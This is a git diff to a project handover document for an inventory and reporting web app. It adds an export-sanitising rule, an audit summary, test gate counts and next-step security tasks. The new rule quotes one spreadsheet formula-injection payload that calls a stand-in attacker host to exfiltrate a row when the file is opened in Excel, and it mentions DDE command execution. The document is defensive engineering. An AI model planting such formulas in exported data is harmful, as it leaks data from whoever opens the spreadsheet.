@@ -1,6 +1,6 @@
 # PROJECT HANDOVER — the authority on what is locked
 
-> **Updated 2026-08-04.** This file holds the LOCKED architecture rules, the
+> **Updated 2026-08-06.** This file holds the LOCKED architecture rules, the
 > baselines, and the developer utilities. It is the authority; when anything
 > else disagrees with it, it wins.
 >
@@ -10,7 +10,9 @@
 > brain), [`docs/PROJECT_STATUS.md`](docs/PROJECT_STATUS.md) (full state +
 > gotchas) and [`REPO_MAP.md`](REPO_MAP.md) (the segregation contract).
 >
-> **Next phase: Feature Fine-Tuning and UI Polish.**
+> **Next phase is a CHOICE, not a queue** — Tier 1 security hardening
+> ([`SECURITY_SUGGESTIONS.md`](SECURITY_SUGGESTIONS.md)) or the Hetzner
+> deployment. See *FUTURE* at the foot of this file.
 > **Hetzner production deployment is PAUSED by decision, not by blocker.**
 
 ---
@@ -396,6 +398,46 @@ planner uses (the pkey already scans backwards), the ledger `TRIM()` expression
 indexes lose to `(SAP_Code, Site_ID)`, and `inventory` is 442 rows. Mirror any
 new index in BOTH `models.py` and a migration. Ledger indexes are never UNIQUE.
 
+### 12. Exported cells are DEFUSED, and numbers are never defused
+
+Added 2026-08-06 by the security audit (PRs #32, #33). Full account:
+[`SECURITY_REVIEW_2026-08-05.md`](SECURITY_REVIEW_2026-08-05.md).
+
+Free text written by the LOWEST-privileged role reaches an approver's
+spreadsheet. `consumption."Remarks"` is typed by a store keeper (level 0) and
+exported by the Daily Consumption report, which an HOD or admin opens in Excel.
+A remark of `=HYPERLINK("https://attacker/?"&A1,"Open")` exfiltrates the row on
+one click; the DDE forms reach command execution. That is privilege escalation
+from the bottom of the ladder, straight past the RBAC the API enforces so
+carefully everywhere else.
+
+`reports._defuse` apostrophe-prefixes the six characters a spreadsheet
+evaluates — `=` `+` `-` `@` tab CR. **Three writers must all route through it**,
+and they are easy to miss because they use different libraries:
+
+| Path | Writer | Hook |
+|---|---|---|
+| `/reports/*` CSV | `csv.writer` | `reports.to_csv` |
+| every other xlsx | **openpyxl** | `xlsx_style.xl_val` |
+| SME workbooks | **xlsxwriter** | `sme_export_layouts._cell` |
+
+The third was missed on the first pass precisely because it is a different
+library with its own type dispatch — `ws.write()` hands a leading `=` to
+`write_formula` on its own, so inheriting the openpyxl guard was never possible.
+
+> ⚠️ **`_defuse` must never touch a number, and that includes numeric STRINGS.**
+> Quantities and valuations arrive as int/float/Decimal and pass through
+> untouched — prefixing one turns an accounting column into text. Subtler:
+> `sme_export_layouts._cell` runs BEFORE `_num()` sums those same rows into
+> GRAND TOTAL, and `_num()` parses with `float()`. Defusing the string `"-5"`
+> makes `float("'-5")` raise, `_num` swallow it as `0.0`, and every negative
+> subtotal vanish from a total that still looks plausible. So a string that IS
+> a number is left alone: Excel reads `-5` as the number, not a formula.
+> `-1+1` parses as no number and IS defused — that is the case that matters.
+
+Suite BK pins all of it, including a real `single_table_xlsx` round trip
+asserting `10.5 + -2.5` still totals `8.0`.
+
 ## Developer utilities — the three scripts in `bin/`
 
 Three separate jobs, deliberately not one script. `dev.sh` owns the DEV stack it
@@ -514,9 +556,25 @@ of them is a regression, not a new normal.
 > later. Suite BJ greps `sme_actuals.py` for the table object and fails if it
 > reappears.
 
+> **Updated 2026-08-06** by the security audit and its two fix branches
+> (PR #32 `fix/formula-injection-and-csp`, PR #33
+> `fix/sme-export-and-nginx-headers`). Full account:
+> [`SECURITY_REVIEW_2026-08-05.md`](SECURITY_REVIEW_2026-08-05.md); forward
+> roadmap in [`SECURITY_SUGGESTIONS.md`](SECURITY_SUGGESTIONS.md).
+> One addition to the LOCKED set — **rule 12, above**: every export writer
+> routes through `_defuse`, and `_defuse` never touches a number.
+>
+> The audit swept auth, RBAC, SQL construction, secrets, uploads, the AI lane
+> and the frontend. **No High-severity findings. No SQL injection, no auth
+> bypass, no XSS sink, no unsafe deserialization.** The one Medium finding —
+> spreadsheet formula injection in report exports — is fixed and pinned by
+> suite BK. A Content-Security-Policy now ships in `deploy/nginx.conf`, and the
+> `location /assets/` block repeats the three security headers verbatim because
+> nginx REPLACES rather than merges an inherited `add_header` set.
+
 | Gate | Result | Command |
 |---|---|---|
-| Backend service tests | **1228 / 0** (suites A…BJ) | `GI_DOTENV=0 .venv/bin/python -m backend.api.service_tests` |
+| Backend service tests | **1245 / 0** (suites A…BK) | `GI_DOTENV=0 .venv/bin/python -m backend.api.service_tests` |
 | Playwright E2E | **57 / 57** (~24 s, own throwaway DB) | `cd tests/e2e && npm test` |
 | SME TS↔PY parity | **1,313 comparisons** | `npm run parity:sme --prefix frontend` |
 | **SME UI math** (session.ts + insights.ts) | **33 / 0** | `npm run test:ui-math --prefix frontend` |
@@ -631,7 +689,32 @@ availability on top of a full order.
 
 ## FUTURE — what happens next
 
-### Immediate next phase: put data in the new tables
+### The next session picks ONE of two tracks
+
+As of 2026-08-06 the codebase is feature-complete, fully documented and green on
+every live gate. Nothing is mid-flight. The next operator chooses:
+
+**Track A — Tier 1 security hardening.** Roughly three days, from
+[`SECURITY_SUGGESTIONS.md`](SECURITY_SUGGESTIONS.md), and it can be done before
+or after deployment:
+
+1. **Enforce 2FA for `admin` and `logistics`.** The machinery is built and
+   correctly hardened; it is simply opt-in, so an admin password is currently the
+   single factor guarding user creation, password resets and database backup.
+   *Highest value of anything on the list.* Enrol two admins BEFORE flipping it.
+2. **Move the OTP and 2FA limiters to a shared store.** `Dockerfile.api` runs
+   four uvicorn workers and those budgets are per-process, so the real limits are
+   ~4x what the code declares. The OTP one has a direct financial cost per bypass.
+3. **Add dependency and static scanning to CI** — `pip-audit`, `npm audit`,
+   `bandit`, Dependabot. There is none today. Start non-blocking.
+
+**Track B — the Hetzner deployment**, below. Unchanged and still ready.
+
+Either is a legitimate starting point. If deployment is imminent, do items 1 and
+3 first — they are cheap, and both are harder to retrofit once real users are on
+the box.
+
+### Then: put data in the new tables
 
 `storage_locations`, `material_locations` and `asset_units` are all **empty**. The
 features are live and tested; nothing has been registered in them. Two routes, and
